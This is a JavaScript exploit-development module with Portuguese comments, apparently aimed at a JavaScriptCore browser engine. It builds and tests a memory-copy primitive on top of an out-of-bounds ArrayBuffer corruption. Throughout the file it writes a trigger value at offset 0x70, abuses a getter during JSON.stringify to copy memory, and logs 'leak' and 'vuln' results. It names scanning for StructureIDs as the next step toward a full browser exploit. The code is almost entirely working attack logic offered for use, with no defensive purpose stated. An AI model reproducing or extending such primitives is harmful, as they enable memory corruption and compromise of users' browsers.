// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.9";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_9";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C; // Onde plantamos o DWORD do endereço fonte da cópia
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;     // Onde o "ponteiro fonte mágico" (0xDWORD_0) aparece
const CORRUPTION_OFFSET_TRIGGER = 0x70;        // Onde escrevemos 0xFFFFFFFF_FFFFFFFF para acionar a "mágica"
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Mudar um pouco o destino para evitar conflitos com testes anteriores

let getter_copy_called_flag_v10_9 = false;

// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_9)
// Objetivo: Ler 8 bytes de oob_array_buffer_real[dword_source_offset_to_read_from]
//           e copiá-los para oob_array_buffer_real[TARGET_COPY_DEST_OFFSET_IN_OOB]
// Mecanismo:
// 1. Planta `dword_source_offset_to_read_from` como a parte baixa de um QWORD em PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD.
// 2. A corrupção em CORRUPTION_OFFSET_TRIGGER faz com que o QWORD em INTERMEDIATE_PTR_OFFSET_0x68
//    se torne `0x(dword_source_offset_to_read_from)_00000000`.
// 3. O getter usa a parte ALTA (`dword_source_offset_to_read_from`) do QWORD em 0x68 como o offset para ler.
// ============================================================
async function readFromOOBOffsetViaCopy_v10_9(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_9`;
    getter_copy_called_flag_v10_9 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        logS3("ALERTA: oob_array_buffer_real não inicializado antes de readFromOOBOffsetViaCopy!", "error", FNAME_PRIMITIVE);
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha CRÍTICA ao inicializar ambiente OOB na primitiva de cópia.", "critical", FNAME_PRIMITIVE);
            return null; // Indica falha da primitiva
        }
    }

    // Limpar área de destino da cópia
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);

    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em 0x6C.
    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0xCAFE0000); // Parte alta pode ser qualquer coisa, não é usada para formar 0x68
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
    // logS3(`  [CopyPrim] Plantado ${value_to_plant_at_0x6c.toString(true)} em ${toHex(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD)}`, "info", FNAME_PRIMITIVE);
    
    const qword_at_0x68_before_trigger = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
    // logS3(`  [CopyPrim] QWORD em ${toHex(INTERMEDIATE_PTR_OFFSET_0x68)} ANTES do trigger: ${qword_at_0x68_before_trigger.toString(true)}`, "info", FNAME_PRIMITIVE);
    // Esperado: 0x(dword_source_offset_to_read_from)_XXXXXXXXXXXXXXXX (parte baixa de 0x68 é o que estava lá antes ou lixo)
    // A corrupção em 0x70 deve zerar a parte baixa de 0x68.

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_9 = true;
            try {
                const qword_at_0x68_in_getter = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68_in_getter.high(); // Deve ser dword_source_offset_to_read_from

                // logS3(`    [GETTER] QWORD em 0x68: ${qword_at_0x68_in_getter.toString(true)}. Effective read offset: ${toHex(effective_read_offset)}`, "info", FNAME_PRIMITIVE);

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0x0B000B00, 0x0B000B00), 8); // OOB Read Error
                    }
                } else { // Falha na "mágica" de 0x68
                    logS3(`    [GETTER] ERRO: effective_read_offset (${toHex(effective_read_offset)}) não corresponde ao dword_source_offset_to_read_from (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68_in_getter.toString(true)}`, "critical", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                }
            } catch (e_getter) {
                logS3(`    [GETTER] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_9_done";
        }
    };

    // Acionar a corrupção principal em 0x70, que afeta 0x6C e, por consequência, 0x68
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    // AVISO: A ordem importa. A escrita em 0x70 pode afetar o valor em 0x6C que plantamos se eles se sobrepuserem
    // CORRUPTION_OFFSET_TRIGGER é 0x70. PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD é 0x6C.
    // A escrita em 0x70 sobrescreve os 4 bytes altos de 0x6C e os 4 bytes baixos de 0x74.
    // Então, o valor em 0x6C (QWORD) se torna: 0xFFFFFFFF_(dword_source_offset_to_read_from)
    // E o valor em 0x68 (QWORD) se torna: 0x(dword_source_offset_to_read_from)_00000000 (esta é a "mágica")
    await PAUSE_S3(10);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_9) {
        logS3(`ALERTA: Getter (${GETTER_PROPERTY_NAME_COPY}) NÃO foi chamado!`, "error", FNAME_PRIMITIVE);
        return null;
    }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}


// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.9)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.validateCopyPrimitive_v10.9`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste Focado na Primitiva de Cópia ---`, "test", FNAME_CURRENT_TEST);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // Teste 1: Tentar copiar de um offset conhecido com dados conhecidos
        const SRC_OFFSET_TEST1 = 0x200;
        const DATA_TO_PLANT_TEST1_LOW = 0x11223344;
        const DATA_TO_PLANT_TEST1_HIGH = 0x55667788;
        const QWORD_TO_PLANT_TEST1 = new AdvancedInt64(DATA_TO_PLANT_TEST1_LOW, DATA_TO_PLANT_TEST1_HIGH);

        logS3(`PASSO 1: Validando primitiva de cópia. Escrevendo ${QWORD_TO_PLANT_TEST1.toString(true)} em ${toHex(SRC_OFFSET_TEST1)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(SRC_OFFSET_TEST1, QWORD_TO_PLANT_TEST1, 8);
        
        logS3(`  Chamando readFromOOBOffsetViaCopy_v10_9 para ler de ${toHex(SRC_OFFSET_TEST1)}...`, "info", FNAME_CURRENT_TEST);
        let copied_data_test1 = await readFromOOBOffsetViaCopy_v10_9(SRC_OFFSET_TEST1);

        if (copied_data_test1) {
            logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${copied_data_test1.toString(true)}`, "leak", FNAME_CURRENT_TEST);
            if (copied_data_test1.equals(QWORD_TO_PLANT_TEST1)) {
                logS3("    !!!! SUCESSO NA VALIDAÇÃO DA PRIMITIVA DE CÓPIA !!!! Os dados foram copiados corretamente.", "vuln", FNAME_CURRENT_TEST);
                document.title = "Primitiva Cópia OK!";
            } else {
                logS3("    FALHA NA VALIDAÇÃO: Os dados copiados não correspondem aos originais.", "error", FNAME_CURRENT_TEST);
                document.title = "Primitiva Cópia FALHOU!";
            }
        } else {
            logS3("    FALHA NA VALIDAÇÃO: A primitiva de cópia retornou null (getter provavelmente não foi chamado).", "error", FNAME_CURRENT_TEST);
            document.title = "Primitiva Cópia: Getter Falhou";
        }
        await PAUSE_S3(100);

        // Teste 2: Tentar copiar de um offset diferente
        const SRC_OFFSET_TEST2 = 0x450;
        const DATA_TO_PLANT_TEST2_LOW = 0xAABBCCDD;
        const DATA_TO_PLANT_TEST2_HIGH = 0xFEFEFEFE;
        const QWORD_TO_PLANT_TEST2 = new AdvancedInt64(DATA_TO_PLANT_TEST2_LOW, DATA_TO_PLANT_TEST2_HIGH);

        logS3(`PASSO 2: Testando cópia de ${toHex(SRC_OFFSET_TEST2)}. Escrevendo ${QWORD_TO_PLANT_TEST2.toString(true)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(SRC_OFFSET_TEST2, QWORD_TO_PLANT_TEST2, 8);

        logS3(`  Chamando readFromOOBOffsetViaCopy_v10_9 para ler de ${toHex(SRC_OFFSET_TEST2)}...`, "info", FNAME_CURRENT_TEST);
        let copied_data_test2 = await readFromOOBOffsetViaCopy_v10_9(SRC_OFFSET_TEST2);

        if (copied_data_test2) {
            logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${copied_data_test2.toString(true)}`, "leak", FNAME_CURRENT_TEST);
            if (copied_data_test2.equals(QWORD_TO_PLANT_TEST2)) {
                logS3("    !!!! SUCESSO NO TESTE 2 DA PRIMITIVA DE CÓPIA !!!!", "good", FNAME_CURRENT_TEST);
            } else {
                logS3("    FALHA NO TESTE 2: Os dados copiados não correspondem.", "error", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    FALHA NO TESTE 2: A primitiva de cópia retornou null.", "error", FNAME_CURRENT_TEST);
        }

        logS3("Se a primitiva de cópia estiver validada, o próximo passo é usá-la para escanear por StructureIDs.", "info", FNAME_CURRENT_TEST);


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
